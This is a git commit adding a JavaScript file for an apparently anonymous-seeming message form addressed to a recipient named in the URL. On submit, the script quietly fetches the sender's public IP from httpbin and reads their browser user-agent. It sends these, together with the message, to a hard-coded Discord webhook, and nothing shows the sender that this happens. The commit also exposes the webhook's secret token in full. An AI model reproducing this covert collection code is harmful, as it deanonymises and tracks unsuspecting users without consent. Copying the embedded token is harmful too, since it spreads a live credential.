37f7ebc0a6b8b5f6c0a3de22307518b72b9028b8
ngllink <ngllinkbusy@outlook.com>
2025-05-06 00:14:03 +0100

    Add files via upload

---
+++ main.js
@@ -0,0 +1,32 @@
+var params=new URLSearchParams(window.location.search);
+var user=params.get("para");
+document.querySelector("span").innerText=user;
+async function enviar(){
+  
+  var webhook="https://discord.com/api/webhooks/1369053203542315112/PoOeV-T_Q2LqUFw_Ts1FSzgSLAmB5BouBY0IraAcuLmkZtffNgXE3rBiamrA0tIEqnQV";
+  
+  
+  
+  var texto=document.querySelector("textarea").value;
+  console.log(texto);
+  if(texto.length<5){
+    alert("Insira mais conteúdo no campo de texto.");
+  }
+  else{
+    var resp=await fetch("http://httpbin.org/ip");
+    var ip=await resp.json();
+    ip=ip.origin;
+    var userAgent=navigator.userAgent;
+    msg={content:"=======\n"+"IP: "+ip+"\nUser-Agent: "+userAgent+"\n\nMensagem:\n"+texto+"\n\n======="};
+    await fetch(webhook,{
+      "method":"POST",
+      "headers": {"Content-Type":"application/json"},
+      body: JSON.stringify(msg)
+    }
+    );
+    
+    
+    
+    
+  }
+}
